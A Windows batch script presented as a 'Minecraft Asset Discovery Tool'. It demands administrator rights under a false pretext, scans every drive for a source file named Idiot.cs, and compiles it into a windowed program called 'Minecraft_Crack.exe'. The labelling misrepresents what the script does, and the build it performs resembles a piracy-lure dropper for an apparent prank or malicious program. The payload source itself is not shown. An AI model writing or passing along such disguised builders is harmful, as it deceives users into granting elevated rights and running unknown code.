@echo off
title Minecraft Asset Discovery Tool
color 0b

:: 1. ADMIN PRIVILEGE CHECK
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [!!] ERROR: PLEASE RUN AS ADMINISTRATOR [!!]
    echo This is required to discover game assets across all drives.
    pause
    exit
)

:: 2. SCANNING ALL DRIVES FOR Idiot.cs
echo [SYSTEM] Starting deep scan for "Idiot.cs"...
echo This may take a moment depending on your system size.
echo.

set "FINAL_PATH="

:: Loop through all possible drive letters
for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (
        echo [SCANNING] Checking drive %%d:...
        for /r %%d:\ %%f in (Idiot.cs) do (
            if exist "%%f" (
                set "FINAL_PATH=%%f"
                goto :found
            )
        )
    )
)

:found
if not defined FINAL_PATH (
    echo.
    echo [!!] ERROR: "Idiot.cs" not found on any accessible drive!
    echo Please make sure the file exists somewhere on your VM.
    pause
    exit
)

echo.
echo [OK] Source discovered at: %FINAL_PATH%
echo [SYSTEM] Initializing game build...

:: 3. COMPILER DETECTION
set "CSC="
if exist "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" (
    set "CSC=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
) else if exist "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" (
    set "CSC=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
)

if not defined CSC (
    echo [!!] ERROR: C# Compiler not found. Please install .NET Framework.
    pause
    exit
)

:: 4. COMPILATION
echo [OK] Compiler active. Building "Minecraft_Crack.exe"...
"%CSC%" /target:winexe /r:System.Windows.Forms.dll /r:System.Drawing.dll /out:"Minecraft_Crack.exe" "%FINAL_PATH%"

if exist "Minecraft_Crack.exe" (
    echo.
    echo ==============================================
    echo   SUCCESS! "Minecraft_Crack.exe" is ready.
    echo ==============================================
) else (
    echo.
    echo [!!] BUILD FAILED. Check the source code for errors.
)

pause
